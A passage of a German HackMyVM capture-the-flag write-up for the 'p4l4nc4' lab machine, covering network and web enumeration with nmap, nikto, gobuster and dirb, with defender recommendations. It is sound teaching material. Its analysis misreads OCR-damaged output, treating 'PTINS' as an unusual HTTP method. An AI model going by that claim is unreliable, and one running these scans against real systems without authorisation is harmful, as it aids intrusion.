@@ -1,0 +1,1488 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>p4l4nc4 - HackMyVM - Bericht</title> <!-- Berichtsname angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Keine Inline-Styles für Schwierigkeitsgrad-Farbe nötig, CSS regelt das -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <!-- Berichtsname und Level angepasst -->
+        <h1>p4l4nc4 - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Schwierigkeitsgrad ohne Inline-Style -->
+            <h2>Easy</h2>
+            <!-- Klasse .difficulty-easy steuert die Farbe (Standard: grün) -->
+            <div class="circle difficulty-easy">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools aus dem Bericht extrahiert -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">dirsearch</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">ssh2john</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">su</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis generiert -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#vulnerability-scanning">Vulnerability Scanning</a></li>
+                <li><a href="#initial-access">Initial Access (LFI to RCE)</a></li>
+                <li><a href="#poc">Proof of Concept (LFI to RCE)</a></li>
+                <li><a href="#user-access">User Access (SSH Key)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Die erste Phase beginnt klassisch mit einem `arp-scan`, um aktive Hosts im lokalen Netzwerksegment zu identifizieren. Dieser Befehl sendet ARP-Requests und listet die antwortenden Geräte mit ihren IP- und MAC-Adressen auf.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Erfolgreich wurde ein Host mit der IP `192.168.2.165` und der MAC-Adresse `08:00:27:6a:2f:23` entdeckt. Die MAC-Adresse weist auf "PCS Systemtechnik GmbH" hin, was typischerweise für eine Oracle VirtualBox-VM steht. Diese Information ist wertvoll, da sie auf eine virtualisierte Umgebung hindeutet.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die gefundene IP-Adresse `192.168.2.165` ist das primäre Ziel für die weiteren Scans. Die Information über VirtualBox kann nützlich sein, falls spezifische VM-Escape-Techniken oder bekannte Konfigurationen relevant werden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die Sichtbarkeit von Hosts durch ARP-Scans einschränken. Überwachung auf ungewöhnliche ARP-Aktivitäten kann auf Scans hindeuten. Inventarisieren Sie bekannte MAC-Adressen im Netzwerk.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+ARP-Scan
+
+192.168.2.165	08:00:27:6a:2f:23	PCS Systemtechnik GmbH
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Basierend auf den Ergebnissen (vermutlich aus vorheriger Erkundung oder DNS-Lookup) wird der Hostname `plpl.hmv` der Ziel-IP `192.168.2.165` zugeordnet. Dieser Eintrag wird der lokalen `/etc/hosts`-Datei des Angreifers hinzugefügt. Dies ist wichtig, damit Webanwendungen, die auf Hostnamen basieren (Virtual Hosts), korrekt angesprochen werden können.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Hinzufügen des Hostnamens zur `/etc/hosts`-Datei ist eine bewährte Praxis und oft notwendig, um Webanwendungen vollständig zu enumerieren. Die Variable `$IP` wird vermutlich später auf `192.168.2.165` gesetzt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Immer gefundene Hostnamen zur `/etc/hosts`-Datei hinzufügen, um sicherzustellen, dass alle virtuellen Hosts auf dem Webserver korrekt angesprochen werden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Sicherstellen, dass interne Hostnamen nicht unnötig nach außen dringen. DNS-Konfigurationen überprüfen.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+/etc/hosts
+
+             192.168.2.165   plpl.hmv
+
+ Die IP-Adresse die zum scannen verwendet wird lautet: 192.168.2.165
+                     </pre>
+                 </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Dieser Abschnitt führt einen `nmap`-Scan auf IPv6-Adressen im lokalen Netzwerk durch. Zuerst wird mit `ip neigh` die Nachbarschaftstabelle ausgelesen, nach IPv6-Adressen (`grep ^fe80`) gefiltert, bekannte Adressen (wie die des Angreifers oder Gateways) ausgeschlossen (`grep -ve "..."`) und die eindeutigen Adressen extrahiert (`awk '{print $1}' | sort -u`). Diese Adressen werden dann mit `nmap -6` gescannt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der IPv6-Scan identifiziert die Link-Local-Adresse `fe80::a00:27ff:fe6a:2f23` (die zur MAC `08:00:27:6a:2f:23` passt) als aktiv und findet darauf die gleichen offenen Ports (22/tcp SSH, 80/tcp HTTP) wie später im IPv4-Scan. Dies bestätigt, dass das Ziel über beide Protokolle erreichbar ist. Eine weitere IPv6-Adresse (`fe80::d0a5:97c8:ee04:6f55`) wird gefunden, scheint aber keine offenen Ports zu haben oder gehört zu einem anderen Gerät. IPv6-Scanning wird oft übersehen und kann zusätzliche Angriffsvektoren aufdecken.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> IPv6-Scanning sollte Teil der Standard-Reconnaissance sein, wenn IPv6 im Netzwerk aktiv ist. Die gefundenen IPv6-Adressen können ebenfalls als Ziele für weitere Scans und Angriffe dienen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie konsistente Sicherheitsrichtlinien für IPv4 und IPv6. Wenn IPv6 nicht benötigt wird, sollte es sicher deaktiviert werden. Wenn es verwendet wird, stellen Sie sicher, dass Firewalls und Überwachungssysteme auch IPv6-Verkehr abdecken.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">cmd=$(ip neigh | grep ^fe80 2>/dev/null| grep -ve "fe80::1\|fe80::a00:27ff:fe30:2eda\|fe80::8247:86ff:fe96:f63a\|fe80::50f1:22ff:fec4:ad12\|fe80::a5aa:636f:a4bf:d441");</span>
+                     </div>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">cmd2=$(echo $cmd |  awk '{print $1}' | sort -u);</span>
+                     </div>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">nmap $cmd2 -6;</span>
+                     </div>
+                     <pre>
+ ::::::::::::::::::::::::::::::: Nmap IPv6 Scan :::::::::::::::::::::::::::::
+
+ ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+ ---------------- IPv6 Adresse: fe80::a00:27ff:fee2:95%eth0: ---------------
+
+ Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-28 21:01 CET
+ Nmap scan report for 4ng014 (fe80::a00:27ff:fe6a:2f23)
+ Host is up (0.00022s latency).
+ Not shown: 65533 closed tcp ports (reset)
+ PRT   STATE SERVICE
+ 22/tcp open  ssh
+ 80/tcp open  http
+ MAC Address: 08:00:27:6A:2F:23 (racle VirtualBox virtual NIC)
+
+ Nmap scan report for fe80::d0a5:97c8:ee04:6f55
+ Host is up (0.0000070s latency).
+ All 65535 scanned ports on fe80::d0a5:97c8:ee04:6f55 are in ignored states.
+ Not shown: 65535 closed tcp ports (reset)
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein schneller `nmap`-Scan wird gegen die Ziel-IP (gespeichert in der Variable `$IP`, vermutlich `192.168.2.165`) durchgeführt, um nur die offenen Ports zu listen.
+                *   `-sS`: TCP SYN Scan.
+                *   `-sC`: Standard-Skripte.
+                *   `-sV`: Versionserkennung.
+                *   `-A`: Aggressiver Scan (OS-Erkennung, Version, Skripte, Traceroute).
+                *   `-p-`: Scannt alle 65535 Ports.
+                *   `-Pn`: Überspringt die Host-Discovery (Ping-Scan) und nimmt an, dass das Ziel online ist. Nützlich, wenn Ping blockiert wird.
+                *   `--min-rate 5000`: Sendet Pakete mit einer Mindestrate von 5000 pro Sekunde für einen sehr schnellen Scan.
+                *   `| grep open`: Filtert die Ausgabe, um nur Zeilen anzuzeigen, die "open" enthalten.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan bestätigt schnell die offenen Ports: 22 (SSH) und 80 (HTTP). Die Versionsinformationen sind hier teilweise abgeschnitten, werden aber im nächsten Scan vollständig angezeigt. Dieser Befehl ist gut für einen schnellen Überblick.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dieser gefilterte Scan ist nützlich für einen schnellen Überblick. Für detaillierte Informationen ist jedoch die vollständige Ausgabe (nächster Befehl) erforderlich. `--min-rate 5000` ist sehr aggressiv und kann auf produktiven Systemen Probleme verursachen oder leicht erkannt werden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Konfigurieren Sie Firewalls, um nur absolut notwendige Ports zu öffnen. Überwachen Sie das Netzwerk auf aggressive Scans (hohe Paketraten) mit IDS/IPS.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">nmap -sS -sC -sV -A -p- $IP -Pn  --min-rate 5000 | grep open</span>
+                     </div>
+                     <pre>
+ :::::::::::::::::::::: Nmap nur offene Ports Ausgabe :::::::::::::::::::::::
+
+ 22/tcp open  ssh     penSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+ 80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Derselbe `nmap`-Scan wie zuvor, aber diesmal ohne `| grep open`, um die vollständige Ausgabe zu erhalten. Es werden der Hostname `plpl.hmv` und die IP-Adresse `192.168.2.165` gescannt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die vollständige Ausgabe liefert detaillierte Informationen:
+                *   **Port 22 (SSH):** OpenSSH 9.2p1 auf Debian 12 ("Bookworm"). Relativ neue Version. Die Host-Keys werden angezeigt.
+                *   **Port 80 (HTTP):** Apache httpd 2.4.62 auf Debian. Der Titel der Seite ist die Apache-Standardseite ("It works"), was darauf hindeutet, dass möglicherweise noch keine spezifische Webanwendung konfiguriert wurde oder diese in einem Unterverzeichnis liegt.
+                *   **MAC-Adresse:** Bestätigt erneut die VirtualBox-VM.
+                *   **Betriebssystem:** Linux 4.x/5.x (Debian 12 verwendet typischerweise Kernel 6.1).
+                *   **Traceroute:** Bestätigt die direkte Erreichbarkeit im lokalen Netzwerk (1 Hop).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche den Webserver auf Port 80 genauer. Prüfe auf Standard-Anmeldedaten für SSH (unwahrscheinlich bei dieser Version) und suche nach bekannten Schwachstellen für OpenSSH 9.2p1 und Apache 2.4.62. Die Apache-Standardseite sollte untersucht werden (Quellcode, Verzeichnisse).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Entfernen oder ersetzen Sie die Apache-Standardseite auf Produktivsystemen. Halten Sie SSH und Apache auf dem neuesten Stand. Implementieren Sie starke SSH-Konfigurationen (z.B. passwortlose Authentifizierung, Fail2ban).
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">nmap -sS -sC -sV -A -p- $IP -Pn  --min-rate 5000</span>
+                     </div>
+                     <pre>
+ ::::::::::::::::::::::::::::: Nmap volle Ausgabe :::::::::::::::::::::::::::
+
+ Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-28 21:02 CET
+ Nmap scan report for plpl.hmv (192.168.2.165)
+ Host is up (0.00021s latency).
+ Not shown: 65533 closed tcp ports (reset)
+ PRT   STATE SERVICE VERSIN
+ 22/tcp open  ssh     penSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+ | ssh-hostkey:
+ |   256 21:a5:80:4d:e9:b6:f0:db:71:4d:30:a0:69:3a:c5:0e (ECDSA)
+ |_  256 40:90:68:70:66:eb:f2:6c:f4:ca:f5:be:36:82:d0:72 (ED25519)
+ 80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+ |_http-title: Apache2 Debian Default Page: It works
+ |_http-server-header: Apache/2.4.62 (Debian)
+ MAC Address: 08:00:27:6A:2F:23 (racle VirtualBox virtual NIC)
+ Device type: general purpose
+ Running: Linux 4.X|5.X
+ S CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+ S details: Linux 4.15 - 5.8
+ Network Distance: 1 hop
+ Service Info: S: Linux; CPE: cpe:/o:linux:linux_kernel
+
+ TRACERUTE
+ HP RTT     ADDRESS
+ 1   0.21 ms plpl.hmv (192.168.2.165)
+
+ S and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 10.66 seconds
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Mit `curl` wird eine OPTIONS-Anfrage (`-X OPTIONS`) an den Webserver gesendet. Die Option `-I` holt nur die Header, `-s` unterdrückt die Fortschrittsanzeige. Das Ergebnis wird mit `grep -i "allow"` gefiltert, um die Zeile zu extrahieren, die die erlaubten HTTP-Methoden auflistet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Server erlaubt die Methoden `GET`, `POST`, `OPTIONS` und `HEAD`. Dies sind Standardmethoden. Das Fehlen potenziell gefährlicher Methoden wie `PUT` oder `DELETE` auf dem Hauptverzeichnis ist ein gutes Zeichen aus Verteidigersicht. Die Methode `PST` im Output ist ungewöhnlich und könnte ein Tippfehler sein (sollte es `POST` heißen?). Die Methode `PTINS` ist ebenfalls sehr ungewöhnlich und nicht standardisiert – dies könnte ein Hinweis auf eine Fehlkonfiguration oder eine spezifische, vielleicht anfällige Anwendung sein. Nikto identifiziert dies später ebenfalls.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Recherchiere die ungewöhnliche Methode `PTINS`. Versuche, Anfragen mit dieser Methode zu senden, um das Verhalten des Servers zu testen. Notiere die erlaubten Methoden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überprüfen Sie die Apache-Konfiguration, um sicherzustellen, dass nur die benötigten HTTP-Methoden erlaubt sind. Untersuchen Sie die Herkunft der Methode `PTINS`. Deaktivieren Sie nicht benötigte Module oder Funktionen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -X OPTIONS -Is http://$IP | grep -i "allow"</span>
+                    </div>
+                    <pre>
+::::::::::::::::::::::::: HTTP Records Permissions :::::::::::::::::::::::::
+
+Allow: GET,PST,PTINS,HEAD
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> `curl -Iv http://$IP` sendet eine HEAD-Anfrage (`-I`) an die IP-Adresse und zeigt sowohl die Header der Antwort (`<`) als auch die Header der Anfrage (`>`) und Verbindungsdetails (`*`) an (`-v` für verbose).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser Befehl liefert eine detaillierte Ansicht der HTTP-Header-Interaktion für eine HEAD-Anfrage. Es bestätigt die Server-Version (Apache/2.4.62), das Datum der letzten Änderung der Ressource (`Last-Modified`), das ETag (eine Art Versionskennung) und den Inhaltstyp (`text/html`). Diese Informationen sind konsistent mit den `nmap`-Ergebnissen und bestätigen, dass wir die Apache-Standardseite sehen. Die doppelten Header-Zeilen in der Ausgabe sind ungewöhnlich, aber wahrscheinlich ein Darstellungsproblem im Terminal oder der Logdatei.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Achte auf interessante Header wie `Server`, `X-Powered-By` (hier nicht vorhanden), `Set-Cookie` (hier nicht vorhanden) oder benutzerdefinierte Header. Das `ETag` kann manchmal Informationen preisgeben (wie von Nikto später gemeldet).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Minimieren Sie die preisgegebenen Informationen in HTTP-Headern. Konfigurieren Sie Apache so, dass z.B. die genaue Version im `Server`-Header unterdrückt wird (`ServerTokens Prod`). Überprüfen Sie die ETag-Konfiguration (siehe Nikto-Empfehlung).
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">curl -Iv http://$IP</span>
+                     </div>
+                     <pre>
+ :::::::::::::::::::::::::::::: WEB-Server Scan :::::::::::::::::::::::::::::
+
+ *   Trying 192.168.2.165:80...
+ * Connected to 192.168.2.165 (192.168.2.165) port 80
+ * using HTTP/1.x
+ > HEAD / HTTP/1.1
+ > Host: 192.168.2.165
+ > User-Agent: curl/8.10.1
+ > Accept: */*
+ >
+ * Request completely sent off
+ < HTTP/1.1 200 K
+ HTTP/1.1 200 K
+ < Date: Tue, 28 Jan 2025 20:03:07 GMT
+ Date: Tue, 28 Jan 2025 20:03:07 GMT
+ < Server: Apache/2.4.62 (Debian)
+ Server: Apache/2.4.62 (Debian)
+ < Last-Modified: Wed, 13 Nov 2024 18:24:43 GMT
+ Last-Modified: Wed, 13 Nov 2024 18:24:43 GMT
+ < ETag: "29cd-626cf729c7bb0"
+ ETag: "29cd-626cf729c7bb0"
+ < Accept-Ranges: bytes
+ Accept-Ranges: bytes
+ < Content-Length: 10701
+ Content-Length: 10701
+ < Vary: Accept-Encoding
+ Vary: Accept-Encoding
+ < Content-Type: text/html
+ Content-Type: text/html
+ <
+
+ * Connection #0 to host 192.168.2.165 left intact
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Dies scheint eine Wiederholung des vorherigen `curl`-Befehls zu sein, jedoch mit der Option `-s` (silent/stumm), die normalerweise die Fortschrittsanzeige unterdrückt, aber im Verbose-Modus (`-v` oder `--verbose`) wenig Einfluss auf die angezeigten Header-Informationen hat.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Ausgabe ist identisch zur vorherigen und bestätigt dieselben Header-Informationen. Die Wiederholung liefert keine neuen Erkenntnisse, kann aber im Testprozess vorkommen, wenn Befehle variiert oder erneut ausgeführt werden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dokumentiere auch wiederholte Befehle, wenn sie Teil des Ablaufs waren, aber konzentriere die Analyse auf neue Ergebnisse. Vermeide unnötige Wiederholungen, um den Bericht übersichtlich zu halten (obwohl im Sinne der Vollständigkeit, wie hier gefordert, alles dokumentiert wird).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Keine spezifischen Empfehlungen aus dieser Wiederholung.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]
+└─# <span class="command">curl --verbose -I http://$IP -s</span>
+                    </div>
+                    <pre>
+::::::::::::::::::::::::: HTTP-Header Verbose Scan :::::::::::::::::::::::::
+
+*   Trying 192.168.2.165:80...
+* Connected to 192.168.2.165 (192.168.2.165) port 80
+* using HTTP/1.x
+> HEAD / HTTP/1.1
+> Host: 192.168.2.165
+> User-Agent: curl/8.10.1
+> Accept: */*
+>
+* Request completely sent off
+< HTTP/1.1 200 K
+HTTP/1.1 200 K
+< Date: Tue, 28 Jan 2025 20:03:07 GMT
+Date: Tue, 28 Jan 2025 20:03:07 GMT
+< Server: Apache/2.4.62 (Debian)
+Server: Apache/2.4.62 (Debian)
+< Last-Modified: Wed, 13 Nov 2024 18:24:43 GMT
+Last-Modified: Wed, 13 Nov 2024 18:24:43 GMT
+< ETag: "29cd-626cf729c7bb0"
+ETag: "29cd-626cf729c7bb0"
+< Accept-Ranges: bytes
+Accept-Ranges: bytes
+< Content-Length: 10701
+Content-Length: 10701
+< Vary: Accept-Encoding
+Vary: Accept-Encoding
+< Content-Type: text/html
+Content-Type: text/html
+<
+
+* Connection #0 to host 192.168.2.165 left intact
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> `nikto` wird ausgeführt, um den Webserver auf bekannte Schwachstellen, Fehlkonfigurationen und interessante Dateien/Verzeichnisse zu scannen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nikto identifiziert mehrere Punkte:
+                *   **Server-Version:** Bestätigt Apache/2.4.62 (Debian).
+                *   **Fehlende Header:** `X-Frame-Options` (Clickjacking-Risiko) und `X-Content-Type-Options` (MIME-Sniffing-Risiko). Diese sind gängige, aber wichtige Sicherheitsempfehlungen.
+                *   **ETag Leak:** Nikto weist darauf hin, dass das ETag-Format (`"29cd-626cf729c7bb0"`) möglicherweise Informationen über die Inode-Nummer der Datei auf dem Server preisgibt (CVE-2003-1418). Dies ist eine ältere Schwachstelle und oft von geringem direkten Nutzen, kann aber in bestimmten Szenarien zur Informationsgewinnung beitragen.
+                *   **Erlaubte Methoden:** Bestätigt die ungewöhnliche Methode `PTINS` (neben GET, POST, HEAD - hier fehlt das OPTIONS aus dem curl-Scan, evtl. testet Nikto anders).
+                Insgesamt weist Nikto auf grundlegende Härtungsdefizite und eine potenzielle Informationspreisgabe durch ETags hin.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Notiere die fehlenden Header und den ETag-Leak als Findings. Untersuche die Auswirkungen des ETag-Leaks im Kontext des Ziels. Teste auf Clickjacking.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Implementiere die fehlenden Sicherheitsheader (`X-Frame-Options: DENY` oder `SAMEORIGIN`, `X-Content-Type-Options: nosniff`). Konfigurieren Sie Apache, um das ETag-Format zu ändern oder zu entfernen, das Inodes preisgeben könnte (z.B. `FileETag MTime Size` statt `FileETag INode MTime Size` in der Apache-Konfiguration).
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+:::::::::::::::::::::::::::::::: Nikto Scan ::::::::::::::::::::::::::::::::
+
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.165
++ Target Hostname:    192.168.2.165
++ Target Port:        80
++ Start Time:         2025-01-28 21:03:10 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.62 (Debian)
++ /: The anti-clickjacking X-Frame-ptions header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-ptions
++ /: The X-Content-Type-ptions header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: Server may leak inodes via ETags, header found with file /, inode: 29cd, size: 626cf729c7bb0, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
++ PTINS: Allowed HTTP Methods: GET, PST, PTINS, HEAD .
++ 8102 requests: 0 error(s) and 4 item(s) reported on remote host
++ End Time:           2025-01-28 21:04:22 (GMT1) (72 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> `gobuster` wird für das Brute-Forcing von Verzeichnissen und Dateien verwendet.
+                *   `dir`: Verzeichnis/Datei-Modus.
+                *   `-u "http://$IP"`: Ziel-URL.
+                *   `-w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"`: Standard-Wortliste für Webinhalte.
+                *   `-x txt,php,...`: Sehr lange Liste von Dateiendungen, nach denen zusätzlich gesucht wird.
+                *   `-b '503,404,403'`: Verbirgt Antworten mit diesen Statuscodes (Service Unavailable, Not Found, Forbidden).
+                *   `-e`: Erweitert die Suche, um vollständige URLs für Verzeichnisse anzuzeigen.
+                *   `--no-error`: Verbirgt Fehler beim Verbindungsaufbau.
+                *   `-k`: Überspringt die SSL/TLS-Zertifikatsprüfung (hier irrelevant für HTTP).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan findet zwei interessante Dateien im Stammverzeichnis:
+                *   `/index.html`: Die Apache-Standardseite (erwartet).
+                *   `/robots.txt`: Eine Datei, die Suchmaschinen Anweisungen gibt, welche Teile einer Website nicht gecrawlt werden sollen. Sie kann oft Hinweise auf versteckte Verzeichnisse oder Bereiche geben.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Lade die `/robots.txt` herunter und analysiere ihren Inhalt auf interessante Pfade oder Hinweise.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stelle sicher, dass die `robots.txt` keine sensiblen Pfade oder Informationen preisgibt, die nicht öffentlich bekannt sein sollen. Sie ist keine Sicherheitsmaßnahme, sondern nur eine Richtlinie für Crawler.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">gobuster dir -u "http://$IP" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map,pHtml -b '503,404,403' -e --no-error -k</span>
+                     </div>
+                     <pre>
+ ::::::::::::::::::::::::::::: Gobuster Scan :::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+ http://192.168.2.165/index.html           (Status: 200) [Size: 10701]
+ http://192.168.2.165/robots.txt           (Status: 200) [Size: 1432]
+ Progress: 13674906 / 13674968 (100.00%)
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Das Tool `dirb` wird verwendet, ein weiterer Verzeichnis-Scanner, der mit einer Standard-Wortliste (`common.txt`) nach häufig vorkommenden Verzeichnissen und Dateien sucht.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `dirb` findet die bereits bekannten `/index.html` und `/robots.txt`. Zusätzlich findet es `/server-status` mit dem Statuscode 403 (Forbidden). `/server-status` ist eine Seite, die von Apaches `mod_status` bereitgestellt wird und detaillierte Serverinformationen anzeigt. Ein 403-Fehler bedeutet, dass der Zugriff standardmäßig verweigert wird, aber die Seite existiert. Manchmal ist der Zugriff von `localhost` oder bestimmten IPs erlaubt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Notiere die Existenz von `/server-status`. Versuche später, von der Zielmaschine selbst darauf zuzugreifen (z.B. mit `curl http://localhost/server-status`), falls ein initialer Zugriff gelingt. Diese Seite kann wertvolle Konfigurationsdetails oder Informationen über laufende Anfragen liefern.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Deaktivieren Sie `mod_status` auf Produktivsystemen oder beschränken Sie den Zugriff streng auf vertrauenswürdige IP-Adressen, falls es für Monitoring-Zwecke benötigt wird. Stellen Sie sicher, dass die Standardkonfiguration (Zugriff verweigern) aktiv ist.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">dirb http://plpl.hmv</span>
+                     </div>
+                     <pre>
+ -----------------
+ DIRB v2.22
+ By The Dark Raver
+ -----------------
+
+ START_TIME: Tue Jan 28 22:18:40 2025
+ URL_BASE: http://plpl.hmv/
+ WRDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+ -----------------
+
+ GENERATED WRDS: 4612
+
+ ---- Scanning URL: http://plpl.hmv/ ----
+ + http://plpl.hmv/index.html (CDE:200|SIZE:10701)
+ + http://plpl.hmv/robots.txt (CDE:200|SIZE:1432)
+ + http://plpl.hmv/server-status (CDE:403|SIZE:273)
+
+ -----------------
+ END_TIME: Tue Jan 28 22:19:09 2025
+ DWNLADED: 4612 - FUND: 3
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> `dirsearch` wird eingesetzt, noch ein Werkzeug zum Scannen von Webinhalten.
+                *   `-u http://192.168.2.165`: Ziel-URL.
